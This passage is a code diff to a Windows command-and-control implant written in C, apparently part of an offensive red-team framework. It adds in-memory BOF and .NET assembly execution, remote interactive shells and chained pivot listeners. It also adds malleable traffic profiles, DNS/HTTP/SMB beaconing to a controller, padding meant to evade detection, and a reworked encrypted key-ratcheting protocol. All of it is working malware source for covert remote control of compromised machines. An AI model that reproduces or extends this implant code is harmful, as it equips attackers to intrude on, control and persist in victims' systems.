-        printf("[EXEC] Assembly .NET\n");
-        //implement .NET execution in memory
-        const char *msg = "[EXEC] .NET exec not yet available\n";
-        two_layer_send(ctx->conn, ctx->trans, "0x02",
-                        msg, (uint16_t)strlen(msg));
-        two_layer_send(ctx->conn, ctx->trans, "0x02", NULL, 0);
+    if (is_coff_bof(ctx->pe_bytes, ctx->pe_size)) {
+        printf("[EXEC] BOF file\n");
+        exec_bof_in_process(ctx);
+    } else if (pe_is_dotnet(ctx->pe_bytes)) {
+        printf("[EXEC] Assembly .NET - CLR hosting in-process\n");
+        exec_dotnet_in_process(ctx);
     } else {
         printf("[EXEC] PE native - reflective loading\n");
         exec_native_in_sacrificial(ctx);
@@ -1463,14 +1684,14 @@ DWORD WINAPI receiveFromServer(LPVOID data) {
     while (1) {
         int recv_result;
         if (LEVEL_CLIENT > 1)
-            recv_result = receive_packet(server_conn, server_trans,
-                                         &received_packet,
-                                         key_enc_father, base_iv_father,
-                                         &rx_ctr_father);
+            recv_result = receive_packet_simple(server_conn, server_trans,
+                                                &received_packet,
+                                                key_enc_father, base_iv_father);
         else
             recv_result = receive_packet(server_conn, server_trans,
-                                         &received_packet,
-                                         key_enc, base_iv, &rx_ctr);
+                                        &received_packet,
+                                        key_rx, iv_rx, ck_rx,
+                                        &rx_epoch, &last_rx_ctr);
  
         if (recv_result != 0) {
             printf("[ERROR] recv failed, retrying...\n");
@@ -1491,25 +1712,15 @@ DWORD WINAPI receiveFromServer(LPVOID data) {
                 (const uint8_t *)received_packet.payload;
  
             if (LEVEL_CLIENT > 1) {
-                if (strncmp(received_packet.opCode, "0x05", OPCODE_LEN) == 0) {
-                    if (dragon_decrypt_payload(key_enc, base_iv, &rx_ctr_shell,
-                                               payload_ptr,
-                                               received_packet.payload_size,
-                                               decrypted_payload) != 0) {
-                        printf("[ERROR] Failed to decrypt shell payload\n");
-                        continue;
-                    }
-                } else {
-                    if (dragon_decrypt_payload(key_enc, base_iv, &rx_ctr,
-                                               payload_ptr,
-                                               received_packet.payload_size,
-                                               decrypted_payload) != 0) {
-                        printf("[ERROR] Failed to decrypt payload\n");
-                        continue;
-                    }
+                uint16_t clear_len;
+                if (dragon_decrypt_blob(key_rx, iv_rx,
+                                        payload_ptr,
+                                        received_packet.payload_size,
+                                        decrypted_payload, &clear_len) != 0) {
+                    printf("[ERROR] Failed to decrypt payload\n");
+                    continue;
                 }
                 payload_ptr = decrypted_payload;
-                uint16_t clear_len = received_packet.payload_size - TAG_LEN;
                 received_packet.payload_size = clear_len;
             }
  
@@ -1527,8 +1738,6 @@ DWORD WINAPI receiveFromServer(LPVOID data) {
  
             /* -- SHELL_START -- */
             else if (strncmp(received_packet.opCode, "0x03", OPCODE_LEN) == 0) {
-                tx_ctr_shell = 0;
-                rx_ctr_shell = 0;
                 if (!g_shell || !g_shell->active)
                     start_interactive_shell(server_conn, server_trans);
                 if (IS_HTTP)  http_set_shell_active(server_conn, 1);
@@ -1611,22 +1820,47 @@ DWORD WINAPI receiveFromServer(LPVOID data) {
  
             /* -- START LISTENER -- */
             else if (strncmp(received_packet.opCode, "0x0B", OPCODE_LEN) == 0) {
-                char buf[64];
-                size_t plen = received_packet.payload_size;
-                if (plen >= sizeof(buf)) plen = sizeof(buf) - 1;
-                memcpy(buf, payload_ptr, plen);
-                buf[plen] = '\0';
+                size_t text_len = strnlen((const char *)payload_ptr, received_packet.payload_size);
+                char buf[128];
+                if (text_len >= sizeof(buf)) text_len = sizeof(buf) - 1;
+                memcpy(buf, payload_ptr, text_len);
+                buf[text_len] = '\0';
                 char *transport = strtok(buf, " ");
                 char *port_str  = strtok(NULL, " ");
-                if (!transport || !port_str) {
+                char *name_str  = strtok(NULL, " ");
+                if (!transport || !port_str || !name_str) {
                     printf("[ERROR] invalid listener payload\n"); continue;
                 }
-                add_listener(transport, atoi(port_str));
+                malleable_profile_t prof;
+                malleable_profile_t *prof_ptr = NULL;
+                size_t prof_offset = text_len + 1;
+                if (prof_offset < received_packet.payload_size) {
+                    uint16_t prof_data_len = (uint16_t)(received_packet.payload_size - prof_offset);
+                    if (profile_deserialize(payload_ptr + prof_offset, prof_data_len, &prof) == 0) {
+                        prof_ptr = &prof;
+                        printf("[LISTENER] Profile received from server\n");
+                        profile_dump(&prof);
+                    }
+                }
+                int rc = add_listener(transport, atoi(port_str), prof_ptr, name_str);
+                /* send ACK back to server */
+                char ack_buf[96];
+                if (rc == 0)
+                    snprintf(ack_buf, sizeof ack_buf, "%s|%d|%s|ok", name_str, atoi(port_str), transport);
+                else
+                    snprintf(ack_buf, sizeof ack_buf, "%s|%d|%s|fail", name_str, atoi(port_str), transport);
+                two_layer_send(server_conn, server_trans, "0x1E", ack_buf, (uint16_t)strlen(ack_buf));
+                printf("[ACK] Listener %s -> %s\n", name_str, rc == 0 ? "ok" : "fail");
             }
  
             /* -- STOP LISTENER -- */
             else if (strncmp(received_packet.opCode, "0x0C", OPCODE_LEN) == 0) {
-                remove_listener(atoi((const char*)payload_ptr));
+                char lname[32] = {0};
+                size_t len = received_packet.payload_size;
+                if (len >= sizeof(lname)) len = sizeof(lname) - 1;
+                memcpy(lname, payload_ptr, len);
+                lname[len] = '\0';
+                remove_listener(lname);
             }
  
             /* -- REQ LISTENERS -- */
@@ -1823,16 +2057,16 @@ DWORD WINAPI receiveFromServer(LPVOID data) {
                 payload_copy[plen] = '\0';
  
                 char *token    = strtok(payload_copy, "|");
-                int   port     = 0;
+                char  listener_name[32] = {0};
                 char  id_father[ID_LEN] = {0};
-                if (token) port = atoi(token);
+                if (token) snprintf(listener_name, sizeof(listener_name), "%s", token);
                 token = strtok(NULL, "|");
                 if (token) snprintf(id_father, ID_LEN, "%s", token);
  
                 if (received_packet.target_level == LEVEL_CLIENT + 1) {
-                    ListenerNode *listener = find_listener_by_port(port);
+                    ListenerNode *listener = find_listener_by_name(listener_name);
                     if (!listener) {
-                        printf("[ERROR] Listener not found port %d\n", port);
+                        printf("[ERROR] Listener not found \"%s\"\n", listener_name);
                         continue;
                     }
  
@@ -1857,9 +2091,10 @@ DWORD WINAPI receiveFromServer(LPVOID data) {
                     if (p) {
                         EnterCriticalSection(&routing_table_mutex);
                         add_route_entry_full(new_child_id,
-                                             p->conn, p->trans, port,
+                                             p->conn, p->trans, listener->port,
                                              p->key_enc, p->base_iv,
-                                             p->tx_ctr, p->rx_ctr);
+                                             p->tx_ctr, p->rx_ctr,
+                                             &p->child_profile, p->child_profile_received);
                         LeaveCriticalSection(&routing_table_mutex);
  
                         EnterCriticalSection(&p->mu);
@@ -1868,11 +2103,11 @@ DWORD WINAPI receiveFromServer(LPVOID data) {
                         WakeConditionVariable(&p->route_ready);
                         LeaveCriticalSection(&p->mu);
  
-                        printf("[ROUTING] Sub-client %s registered on port %d,"
-                               " CV marked\n", new_child_id, port);
+                        printf("[ROUTING] Sub-client %s registered on listener \"%s\","
+                               " CV marked\n", new_child_id, listener_name);
                     } else {
-                        printf("[WARNING] PendingRoute not found on port %d\n",
-                               port);
+                        printf("[WARNING] PendingRoute not found for listener \"%s\"\n",
+                               listener_name);
                     }
  
                 } else {
@@ -1904,7 +2139,8 @@ DWORD WINAPI receiveFromServer(LPVOID data) {
                                              father_route->key_enc,
                                              father_route->base_iv,
                                              father_route->tx_ctr,
-                                             father_route->rx_ctr);
+                                             father_route->rx_ctr,
+                                             NULL, 0);
                         // 2
                         int rc = send_packet_route(&received_packet,
                                                    father_route);
@@ -2093,10 +2329,16 @@ void handle_connection(transport_conn_t *conn, transport_t *trans) {
 
         tx_ctr_father = rx_ctr_father = 0;
 
+        /* Send malleable profile to father as first encrypted frame */
+        if (send_profile(conn, trans, key_enc_father, base_iv_father,
+                         &tx_ctr_father, NULL, NULL, 1) != 0) {
+            printf("[ERROR] Failed to send profile to father\n");
+            trans->close(conn); WSACleanup(); return;
+        }
+
         /* Received father_id (0x00) */
-        if (receive_packet(conn, trans, &packet,
-                           key_enc_father, base_iv_father,
-                           &rx_ctr_father) != 0
+        if (receive_packet_simple(conn, trans, &packet,
+                           key_enc_father, base_iv_father) != 0
             || strncmp(packet.opCode, "0x00", OPCODE_LEN) != 0)
         {
             printf("[ERROR] Failed to receive father ID\n");
@@ -2105,17 +2347,17 @@ void handle_connection(transport_conn_t *conn, transport_t *trans) {
         printf("0x00 with father ID received\n");
         snprintf(father_id, ID_LEN, "%s", packet.payload);
 
-        /* Send MAC|father_id|father_port to the server (through father) */
+        /* Send MAC|father_id|listener_name to the server (through father) */
         memset(&packet, 0, sizeof(packet));
         get_socket_mac_address(conn, trans, mac_address);
-        snprintf(payload, sizeof(payload), "%s|%s|%d",
-                 mac_address, father_id, FATHER_PORT);
+        snprintf(payload, sizeof(payload), "%s|%s|%s",
+                 mac_address, father_id, FATHER_LISTENER_NAME);
         snprintf(packet.opCode, OPCODE_LEN, "%s", "0x00");
         snprintf(packet.payload, sizeof(packet.payload), "%s", payload);
         packet.payload_size = (uint16_t)strlen(packet.payload);
         packet.target_level = LEVEL_CLIENT;
 
-        if (send_packet(conn, trans, &packet,
+        if (send_packet_simple(conn, trans, &packet,
                         key_enc_father, base_iv_father, &tx_ctr_father) < 0) {
             printf("[ERROR] Failed to send init to server (via father)\n");
             trans->close(conn); WSACleanup(); return;
@@ -2133,7 +2375,7 @@ void handle_connection(transport_conn_t *conn, transport_t *trans) {
         hs_relay.target_level = LEVEL_CLIENT;
         snprintf(hs_relay.target_id, ID_LEN, "%s", "SERVER");
 
-        if (send_packet(conn, trans, &hs_relay,
+        if (send_packet_simple(conn, trans, &hs_relay,
                         key_enc_father, base_iv_father, &tx_ctr_father) < 0) {
             printf("[ERROR] Failed to send ephemeral pubkey\n");
             trans->close(conn); WSACleanup(); return;
@@ -2141,9 +2383,8 @@ void handle_connection(transport_conn_t *conn, transport_t *trans) {
 
         /* Receive ACK 0x11 */
         memset(&packet, 0, sizeof(packet));
-        if (receive_packet(conn, trans, &packet,
-                           key_enc_father, base_iv_father,
-                           &rx_ctr_father) != 0
+        if (receive_packet_simple(conn, trans, &packet,
+                           key_enc_father, base_iv_father) != 0
             || strncmp(packet.opCode, "0x11", OPCODE_LEN) != 0)
         {
             printf("[ERROR] Failed to receive handshake response\n");
@@ -2158,12 +2399,23 @@ void handle_connection(transport_conn_t *conn, transport_t *trans) {
         }
         uint8_t km[64];
         crypto_kdf_derive_from_key(km, 64, 0x01, "DRAGONHS", shared);
-        crypto_generichash(key_enc,   KEY_LEN,  km, 64, (uint8_t*)"enc", 3);
-        crypto_generichash(base_iv,   NONCE_LEN,km, 64, (uint8_t*)"iv",  2);
-        crypto_generichash(chain_key, KEY_LEN,  km, 64, (uint8_t*)"ck",  2);
+        uint8_t ke[KEY_LEN], bi[NONCE_LEN], ck_tmp[KEY_LEN];
+        crypto_generichash(ke,     KEY_LEN,   km, 64, (uint8_t*)"enc", 3);
+        crypto_generichash(bi,     NONCE_LEN, km, 64, (uint8_t*)"iv",  2);
+        crypto_generichash(ck_tmp, KEY_LEN,   km, 64, (uint8_t*)"ck",  2);
         sodium_memzero(shared, sizeof shared);
         sodium_memzero(km,     sizeof km);
-        tx_ctr = rx_ctr = 0;
+
+        dragon_derive_keys(ke, bi, ck_tmp, 0,
+                           key_tx, iv_tx, ck_tx,
+                           key_rx, iv_rx, ck_rx);
+        sodium_memzero(ke,     KEY_LEN);
+        sodium_memzero(bi,     NONCE_LEN);
+        sodium_memzero(ck_tmp, KEY_LEN);
+        tx_ctr      = 0;
+        tx_epoch    = 0;
+        rx_epoch    = 0;
+        last_rx_ctr = UINT64_MAX;
 
         if (consume_handshake_blob(&packet) != 0) {
             printf("[ERROR] Failed consume blob 0x11\n");
@@ -2176,7 +2428,7 @@ void handle_connection(transport_conn_t *conn, transport_t *trans) {
         confirm.target_level = LEVEL_CLIENT;
         snprintf(confirm.target_id, ID_LEN, "%s", "SERVER");
 
-        if (send_packet(conn, trans, &confirm,
+        if (send_packet_simple(conn, trans, &confirm,
                         key_enc_father, base_iv_father, &tx_ctr_father) < 0) {
             printf("[ERROR] Failed to send 0x13\n");
             trans->close(conn); WSACleanup(); return;
@@ -2184,9 +2436,8 @@ void handle_connection(transport_conn_t *conn, transport_t *trans) {
 
         /* Receive 0x12 with client_id */
         memset(&packet, 0, sizeof(packet));
-        if (receive_packet(conn, trans, &packet,
-                           key_enc_father, base_iv_father,
-                           &rx_ctr_father) != 0
+        if (receive_packet_simple(conn, trans, &packet,
+                           key_enc_father, base_iv_father) != 0
             || strncmp(packet.opCode, "0x12", OPCODE_LEN) != 0)
         {
             printf("[ERROR] Failed to receive client ID\n");
@@ -2209,21 +2460,35 @@ void handle_connection(transport_conn_t *conn, transport_t *trans) {
         if (IS_HTTPS) https_set_hs_mode(conn, 1);
 
         printf("[DEBUG] call dragon_handshake_client\n");
-        if (dragon_handshake_client(conn, trans, SERVER_PUB, key_enc, base_iv, chain_key) != 0) {
+        uint8_t ke[KEY_LEN], bi[NONCE_LEN], ck[KEY_LEN];
+        if (dragon_handshake_client(conn, trans, SERVER_PUB, ke, bi, ck) != 0) {
             if (IS_HTTP) http_set_hs_mode(conn, 0);
             if (IS_HTTPS) https_set_hs_mode(conn, 0);
             printf("[CRYPTO] handshake with server failed\n");
             trans->close(conn); WSACleanup(); return;
         }
+        dragon_derive_keys(ke, bi, ck, 0, key_tx, iv_tx, ck_tx, key_rx, iv_rx, ck_rx);
+        sodium_memzero(ke, KEY_LEN);
+        sodium_memzero(bi, NONCE_LEN);
+        sodium_memzero(ck, KEY_LEN);
+        tx_ctr      = 0;
+        tx_epoch    = 0;
+        rx_epoch    = 0;
+        last_rx_ctr = UINT64_MAX;
         printf("[DEBUG] handshake completed\n");
         if (IS_HTTP) http_set_hs_mode(conn, 0);
         if (IS_HTTPS) https_set_hs_mode(conn, 0);
 
-        tx_ctr = rx_ctr = 0;
+        /* Send malleable profile as first encrypted frame */
+        if (send_profile(conn, trans, key_tx, iv_tx, &tx_ctr,
+                         ck_tx, &tx_epoch, 0) != 0) {
+            printf("[ERROR] Failed to send profile to server\n");
+            trans->close(conn); WSACleanup(); return;
+        }
 
-        /* Send init (MAC||father_port) */
+        /* Send init (MAC||listener_name) */
         get_socket_mac_address(conn, trans, mac_address);
-        snprintf(payload, sizeof(payload), "%s||%d", mac_address, FATHER_PORT);
+        snprintf(payload, sizeof(payload), "%s||%s", mac_address, FATHER_LISTENER_NAME);
 
         memset(&packet, 0, sizeof(packet));
         snprintf(packet.opCode, OPCODE_LEN, "%s", "0x00");
@@ -2232,7 +2497,7 @@ void handle_connection(transport_conn_t *conn, transport_t *trans) {
         packet.target_level = LEVEL_CLIENT;
 
         if (send_packet(conn, trans, &packet,
-                        key_enc, base_iv, &tx_ctr) < 0) {
+                        key_tx, iv_tx, &tx_ctr, ck_tx, &tx_epoch) < 0) {
             printf("[ERROR] Failed to send init to server\n");
             trans->close(conn); WSACleanup(); return;
         }
@@ -2240,7 +2505,7 @@ void handle_connection(transport_conn_t *conn, transport_t *trans) {
         /* Receive client_id */
         memset(&packet, 0, sizeof(packet));
         if (receive_packet(conn, trans, &packet,
-                           key_enc, base_iv, &rx_ctr) != 0) {
+                           key_rx, iv_rx, ck_rx, &rx_epoch, &last_rx_ctr) != 0) {
             printf("[ERROR] Failed to receive client ID\n");
             trans->close(conn); WSACleanup(); return;
         }
@@ -2284,7 +2549,7 @@ static void http_beacon_loop(transport_conn_t *conn, transport_t *trans)
 
     while (1) {
         printf("[HTTP] connection lost, reconnecting in 5s...\n");
-        Sleep(5000);
+        Sleep(g_reconnect_delay_ms);
 
         const char *host = (LEVEL_CLIENT == 1) ? SERVER_IP  : FATHER_IP;
         int         port = (LEVEL_CLIENT == 1) ? SERVER_PORT : FATHER_PORT;
@@ -2325,6 +2590,28 @@ int main(void) {
     InitializeCriticalSection(&pending_list_mutex);
     listener_list = NULL;
 
+    if (IS_DNS) {
+        strncpy(g_dns_domain, DNS_DOMAIN, sizeof(g_dns_domain) - 1);
+        g_dns_domain[sizeof(g_dns_domain) - 1] = '\0';
+        g_dns_poll_ms = DNS_POLL_MS;
+    }
+
+    if (IS_HTTP) {
+        http_apply_profile(HTTP_USER_AGENT_CFG, HTTP_CONTENT_TYPE_CFG,
+                           HTTP_PATH_DATA_CFG, HTTP_PATH_HS_CFG,
+                           HTTP_EXTRA_HEADERS_CFG);
+    } else if (IS_HTTPS) {
+        https_apply_profile(HTTP_USER_AGENT_CFG, HTTP_CONTENT_TYPE_CFG,
+                            HTTP_PATH_DATA_CFG, HTTP_PATH_HS_CFG,
+                            HTTP_EXTRA_HEADERS_CFG);
+    }
+
+    http_set_padding(PKT_PAD_MIN, PKT_PAD_MAX);
+    https_set_padding(PKT_PAD_MIN, PKT_PAD_MAX);
+    tcp_set_padding(PKT_PAD_MIN, PKT_PAD_MAX);
+    smb_set_padding(PKT_PAD_MIN, PKT_PAD_MAX);
+    smb_apply_pipe_name(SMB_PIPE_NAME);
+
     upstream_trans = transport_get(UPSTREAM_TRANSPORT);
     if (!upstream_trans) {
         printf("Transport %s not found\n", UPSTREAM_TRANSPORT);
@@ -2353,6 +2640,10 @@ int main(void) {
     } else if (IS_HTTPS) {
         printf("[HTTPS] starting HTTPS mode\n");
         http_beacon_loop(upstream_conn, upstream_trans);
+    } else if (IS_DNS) {
+        printf("[DNS] starting DNS mode\n");
+        handle_connection(upstream_conn, upstream_trans);
+        upstream_trans->close(upstream_conn);
     } else {
         handle_connection(upstream_conn, upstream_trans);
         upstream_trans->close(upstream_conn);
